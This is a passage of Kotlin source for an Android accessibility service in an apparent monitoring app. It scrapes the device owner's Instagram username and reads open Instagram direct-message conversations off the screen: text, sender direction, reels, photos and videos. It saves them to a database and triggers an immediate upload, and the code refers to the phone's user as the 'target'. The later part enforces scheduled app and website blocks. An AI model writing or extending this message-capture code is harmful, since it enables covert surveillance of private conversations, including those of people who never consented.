                        val candidate = match2.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
                        if (candidate.length in 3..32 && !reserved.contains(candidate) && !candidate.startsWith("tab") && !candidate.matches("^[0-9]+$".toRegex())) {
                            detectedUsername = candidate
                            break
                        }
                    }
                }
            }

            // STRATEGY 4: Action Bar Title / View IDs (e.g. action_bar_title)
            if (detectedUsername == null && viewIdCandidates.isNotEmpty()) {
                for (cand in viewIdCandidates) {
                    val clean = cand.removePrefix("@").trim().lowercase()
                    if (clean.length in 3..32 &&
                        clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !clean.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(clean)
                    ) {
                        detectedUsername = clean
                        break
                    }
                }
            }

            // STRATEGY 5: Own Profile Screen Detection (when visited)
            val isOwnProfile = allTexts.any {
                it.contains("Edit profile", ignoreCase = true) ||
                it.contains("Share profile", ignoreCase = true) ||
                it.contains("Professional dashboard", ignoreCase = true) ||
                (allTexts.any { t -> t.contains("Followers", ignoreCase = true) } &&
                 allTexts.any { t -> t.contains("Following", ignoreCase = true) })
            }

            if (detectedUsername == null && isOwnProfile) {
                for ((text, rect) in topCandidates) {
                    val candidate = text.removePrefix("@").trim().lowercase()
                    if (rect.top < 450 &&
                        candidate.length in 3..32 &&
                        candidate.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !candidate.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(candidate)
                    ) {
                        detectedUsername = candidate
                        break
                    }
                }
            }

            // STRATEGY 6: Direct Messages Inbox Screen Detection (when visited)
            val isDirectInbox = (allTexts.any { it.equals("Direct", ignoreCase = true) || it.equals("Messages", ignoreCase = true) } &&
                allTexts.any { it.contains("Search", ignoreCase = true) || it.contains("Notes", ignoreCase = true) || it.contains("Requests", ignoreCase = true) })

            if (detectedUsername == null && isDirectInbox) {
                for ((text, rect) in topCandidates) {
                    val candidate = text.removePrefix("@").trim().lowercase()
                    if (rect.top < 350 && rect.left < 500 &&
                        candidate.length in 3..32 &&
                        candidate.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !candidate.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(candidate)
                    ) {
                        detectedUsername = candidate
                        break
                    }
                }
            }

            if (!detectedUsername.isNullOrBlank()) {
                notifyInstagramAccountDetected(detectedUsername)
            }
        } catch (_: Exception) {}
    }

    fun recordInstagramChatIfForeground(root: AccessibilityNodeInfo?) {
        val actualRoot = getInstagramWindowRoot(root) ?: return
        val pkg = actualRoot.packageName?.toString() ?: ""
        if (!pkg.contains("instagram")) return

        // 1. Strict verification: ONLY record if inside an actual conversation!
        if (!isInsideInstagramConversation(actualRoot)) {
            return
        }

        // 2. Find Direct Chat username in top action bar
        val chatTitle = getInstagramCurrentChatTitle(actualRoot)
        if (chatTitle.isNullOrBlank() || isInstagramReservedTitle(chatTitle)) {
            return
        }

        lastClickedInstagramChat = chatTitle
        lastClickedInstagramChatTime = System.currentTimeMillis()

        if (!chatTitle.equals(lastActiveInstagramChatForSignatures, ignoreCase = true)) {
            lastActiveInstagramChatForSignatures = chatTitle
            currentInstagramChatSeenSignatures.clear()
            recordInstagramChatOpened(chatTitle)
        }

        try {
            val entriesToInsert = mutableListOf<InstagramMessageEntry>()
            val now = System.currentTimeMillis()
            val displayMetrics = resources.displayMetrics
            val screenWidth = displayMetrics.widthPixels
            val screenHeight = displayMetrics.heightPixels

            fun extractReelUrl(txt: String?): String? = WhatsAppNotificationListener.extractReelUrl(txt)

            fun findReelUrlInNode(node: AccessibilityNodeInfo?, depth: Int = 0): String? {
                if (node == null || depth > 4) return null
                val t = node.text?.toString()
                val cd = node.contentDescription?.toString()
                extractReelUrl(t)?.let { return it }
                extractReelUrl(cd)?.let { return it }
                for (i in 0 until node.childCount) {
                    val found = findReelUrlInNode(node.getChild(i), depth + 1)
                    if (found != null) return found
                }
                return null
            }

            fun findReelUrlNearby(node: AccessibilityNodeInfo?): String? {
                if (node == null) return null
                findReelUrlInNode(node)?.let { return it }
                node.parent?.let { parent ->
                    findReelUrlInNode(parent)?.let { return it }
                    parent.parent?.let { grandParent ->
                        findReelUrlInNode(grandParent)?.let { return it }
                    }
                }
                return null
            }

            val composerNode = findInstagramComposerNode(actualRoot)
            val composerRect = Rect()
            composerNode?.getBoundsInScreen(composerRect)
            val maxMessageBottom = if (composerRect.top > 100) composerRect.top - 5 else (screenHeight * 0.88f).toInt()
            val minMessageTop = (screenHeight * 0.10f).toInt()

            val candidateNodes = mutableListOf<AccessibilityNodeInfo>()
            fun collectMessageNodes(node: AccessibilityNodeInfo?, depth: Int = 0) {
                if (node == null || depth > 40) return
                try {
                    if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) return
                    val t = node.text?.toString()?.trim()
                    val cd = node.contentDescription?.toString()?.trim()
                    val rect = Rect()
                    node.getBoundsInScreen(rect)

                    // Message bubbles strictly between header and message composer
                    if (rect.top >= minMessageTop && rect.bottom <= maxMessageBottom) {
                        val isTextValid = !t.isNullOrBlank() && !WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(t)
                        val isCdValid = !cd.isNullOrBlank() && !WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(cd)

                        val candidateText = when {
                            isTextValid -> t
                            isCdValid -> cd
                            else -> null
                        }
                        if (!candidateText.isNullOrBlank() &&
                            !candidateText.equals(chatTitle, ignoreCase = true) &&
                            !isInstagramReservedTitle(candidateText) &&
                            !candidateText.equals("Message...", ignoreCase = true) &&
                            !candidateText.equals("Search", ignoreCase = true) &&
                            !candidateText.equals("Instagram", ignoreCase = true)
                        ) {
                            candidateNodes.add(node)
                        }
                    }
                    for (i in 0 until node.childCount) {
                        try {
                            collectMessageNodes(node.getChild(i), depth + 1)
                        } catch (_: Exception) {}
                    }
                } catch (_: Exception) {}
            }
            collectMessageNodes(actualRoot)

            for (node in candidateNodes) {
                val t = node.text?.toString()?.trim()
                val cd = node.contentDescription?.toString()?.trim()
                val isTextValid = !t.isNullOrBlank() && !WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(t)
                val isCdValid = !cd.isNullOrBlank() && !WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(cd)
                val rawText = when {
                    isTextValid -> t!!
                    isCdValid -> cd!!
                    else -> continue
                }
                if (rawText.isBlank() || isInstagramReservedTitle(rawText)) continue
                if (WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(rawText)) continue

                val rect = Rect()
                node.getBoundsInScreen(rect)
                val parentRect = Rect()
                node.parent?.getBoundsInScreen(parentRect)

                var cleanText = when {
                    rawText.startsWith("You sent: ", ignoreCase = true) -> rawText.substring(10).trim()
                    rawText.startsWith("You sent ", ignoreCase = true) -> rawText.substring(9).trim()
                    rawText.startsWith("You: ", ignoreCase = true) -> rawText.substring(5).trim()
                    rawText.startsWith("$chatTitle: ", ignoreCase = true) -> rawText.substring(chatTitle.length + 2).trim()
                    else -> rawText
                }
                cleanText = cleanText.replace("""(?i),\s*\d{1,2}[:.]\d{2}(?::\d{2})?\s*(?:am|pm)?$""".toRegex(), "").trim()
                if (cleanText.isBlank() || isInstagramReservedTitle(cleanText)) continue
                if (WhatsAppNotificationListener.isInstagramUiMetadataOrTimestamp(cleanText)) continue

                val normalizedText = cleanText.lowercase().trim()
                val lastSentTime = recentSentInstagramTexts[normalizedText]
                val isRecentlySentByTarget = lastSentTime != null && (now - lastSentTime) < 120_000L

                val isRightPinned = rect.right >= (screenWidth * 0.72f) && rect.left > (screenWidth * 0.15f)
                val isLeftPinned = rect.left <= (screenWidth * 0.22f) && rect.right < (screenWidth * 0.75f)

                val isOutgoing = when {
                    isRecentlySentByTarget -> true
                    rawText.startsWith("You sent", ignoreCase = true) -> true
                    rawText.startsWith("You:", ignoreCase = true) -> true
                    cd != null && (cd.startsWith("You sent", ignoreCase = true) || cd.startsWith("You:", ignoreCase = true)) -> true
                    rawText.startsWith("$chatTitle: ", ignoreCase = true) -> false
                    cd != null && cd.startsWith("$chatTitle: ", ignoreCase = true) -> false
                    isRightPinned -> true
                    isLeftPinned -> false
                    else -> rect.centerX() > (screenWidth * 0.50f)
                }

                val reelUrl = findReelUrlNearby(node) ?: extractReelUrl(cleanText) ?: extractReelUrl(cd)
                val isReel = reelUrl != null ||
                    cleanText.contains("reel", ignoreCase = true) ||
                    (cd != null && cd.contains("reel", ignoreCase = true)) ||
                    cleanText.contains("shared a reel", ignoreCase = true) ||
                    cleanText.contains("sent a reel", ignoreCase = true)

                val isImage = !isReel && (
                    cleanText.equals("photo", ignoreCase = true) ||
                    cleanText.equals("image", ignoreCase = true) ||
                    cleanText.contains("sent a photo", ignoreCase = true) ||
                    cleanText.contains("shared a photo", ignoreCase = true) ||
                    (cd != null && (cd.equals("photo", ignoreCase = true) || cd.equals("photo thumbnail", ignoreCase = true) || cd.contains("sent a photo", ignoreCase = true)))
                )

                val isVideo = !isReel && !isImage && (
                    cleanText.contains("video", ignoreCase = true) ||
                    (cd != null && cd.contains("video", ignoreCase = true)) ||
                    cleanText.contains("sent a video", ignoreCase = true)
                )

                val itemMediaType = when {
                    isReel -> "reel"
                    isImage -> "image"
                    isVideo -> "video"
                    else -> "text"
                }

                val finalText = when {
                    isReel && (cleanText.isBlank() || cleanText.equals("reel", ignoreCase = true)) -> reelUrl ?: "Shared a Reel"
                    isImage && (cleanText.isBlank() || cleanText.equals("photo", ignoreCase = true) || cleanText.equals("sent a photo", ignoreCase = true)) -> "Photo"
                    isVideo && cleanText.isBlank() -> "Video"
                    else -> cleanText
                }

                val key = "ig|$chatTitle|$finalText|$isOutgoing|$itemMediaType"
                if (currentInstagramChatSeenSignatures.contains(key)) {
                    continue
                }
                currentInstagramChatSeenSignatures.add(key)
                if (currentInstagramChatSeenSignatures.size > 500) {
                    currentInstagramChatSeenSignatures.clear()
                }

                entriesToInsert.add(
                    InstagramMessageEntry(
                        chatName = chatTitle,
                        sender = if (isOutgoing) "me" else chatTitle,
                        messageText = finalText,
                        isOutgoing = isOutgoing,
                        messageTimeEpochMs = now,
                        mediaType = itemMediaType,
                        reelUrl = reelUrl,
                        targetAccount = null
                    )
                )
            }

            if (entriesToInsert.isNotEmpty()) {
                scope.launch {
                    try {
                        val db = AppDatabase.getInstance(applicationContext)
                        val filteredEntries = mutableListOf<InstagramMessageEntry>()
                        for (entry in entriesToInsert) {
                            val existingDirection = db.instagramMessageDao().findRecentMessageDirection(
                                entry.chatName,
                                entry.messageText,
                                entry.messageTimeEpochMs - 2_000L
                            )
                            if (existingDirection == null) {
                                filteredEntries.add(entry)
                            } else if (existingDirection != entry.isOutgoing) {
                                db.instagramMessageDao().updateMessageDirection(
                                    entry.chatName,
                                    entry.messageText,
                                    entry.isOutgoing,
                                    entry.sender,
                                    entry.messageTimeEpochMs - 60_000L
                                )
                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext, immediate = true)
                            }
                        }
                        if (filteredEntries.isNotEmpty()) {
                            db.instagramMessageDao().insertAll(filteredEntries)
                            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext, immediate = true)
                        }
                    } catch (e: Exception) {
                        Log.e("BlockA11y", "Failed to insert captured Instagram messages", e)
                    }
                }
            } else {
                recordInstagramChatOpened(chatTitle)
            }
        } catch (_: Exception) {}
    }

    /**
     * Re-checks the URL bar every ~1.5s while a browser stays foreground —
     * this is what catches navigating to a different site within the same
     * browser window, which never fires its own TYPE_WINDOW_STATE_CHANGED.
     * Cancelled the moment any other app's window comes to the foreground
     * (stopBrowserPolling, above), so it never runs while the user isn't
     * actually in a browser.
     */
    private fun startBrowserPolling() {
        if (browserPollRunnable != null) return // already running
        val runnable = object : Runnable {
            override fun run() {
                checkWebsiteRules()
                pollHandler.postDelayed(this, browserPollIntervalMs)
            }
        }
        browserPollRunnable = runnable
        pollHandler.postDelayed(runnable, browserPollIntervalMs)
    }

    private fun stopBrowserPolling() {
        browserPollRunnable?.let { pollHandler.removeCallbacks(it) }
        browserPollRunnable = null
    }

    private fun loadedRules(): List<BlockRule> {
        if (!::rulesCache.isInitialized) rulesCache = BlockRulesCache(applicationContext)
        return rulesCache.load()
    }

    private fun checkAppRule(packageName: String) {
        val rules = loadedRules()
        if (rules.isEmpty()) return
        val (dayAbbrev, minutesOfDay) = currentDayAndMinute()

        rules.firstOrNull { it.ruleType == "app" && it.target == packageName }
            ?.let { rule ->
                if (rule.isActiveNow(dayAbbrev, minutesOfDay)) {
                    blockForeground(rule, packageName)
                }
            }
    }

    private fun checkWebsiteRules() {
        val websiteRules = loadedRules().filter { it.ruleType == "website" }
        if (websiteRules.isEmpty()) return

        val urlBarText = findUrlBarText(rootInActiveWindow) ?: return
        val (dayAbbrev, minutesOfDay) = currentDayAndMinute()
        websiteRules.firstOrNull { rule ->
            rule.isActiveNow(dayAbbrev, minutesOfDay) && urlBarText.contains(rule.target, ignoreCase = true)
        }?.let { rule -> blockForeground(rule, urlBarText) }
    }

    private fun findUrlBarText(root: AccessibilityNodeInfo?): String? {
        if (root == null) return null
        for (resourceId in browserUrlBarIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(resourceId)
            val text = nodes?.firstOrNull()?.text?.toString()
            if (!text.isNullOrBlank()) return text
        }
        return null
    }

    private fun blockForeground(rule: BlockRule, matchedTarget: String) {
        // Debounce — one window-state event can fire multiple times in quick
        // succession; avoid spamming Home actions and duplicate violation reports.
        val now = System.currentTimeMillis()
        if (matchedTarget == lastBlockedPackage && now - lastBlockedAt < 2000) return
        lastBlockedPackage = matchedTarget
        lastBlockedAt = now

        // NOT startActivity(ACTION_MAIN/CATEGORY_HOME) — Android's background
        // activity launch restrictions (tightened further on MIUI) silently
        // swallow a Context.startActivity() call made from a Service with no
        // visible UI of its own, so detection fired (the alert below proves
        // it) but nothing visibly happened. performGlobalAction is the
        // accessibility-specific API for this exact case — it simulates the
        // physical Home button press directly through the accessibility
        // layer, not through the activity-launch path, so it isn't subject
        // to that restriction.
        performGlobalAction(GLOBAL_ACTION_HOME)

        BlockViolationWorker.enqueue(applicationContext, rule.id, matchedTarget)
    }

    private fun currentDayAndMinute(): Pair<String, Int> {
        val cal = Calendar.getInstance()
        val dayAbbrev = SimpleDateFormat("EEE", Locale.US).format(cal.time).lowercase()
        val minutesOfDay = cal.get(Calendar.HOUR_OF_DAY) * 60 + cal.get(Calendar.MINUTE)
        return dayAbbrev to minutesOfDay
    }

    override fun onInterrupt() {
        stopBrowserPolling()
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        com.spapp.monitoring.collectors.RealtimeLogObserverManager.stop(applicationContext)
    }

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        instance = null
        return true
    }

    override fun onRebind(intent: android.content.Intent?) {
        super.onRebind(intent)
        instance = this
    }
}
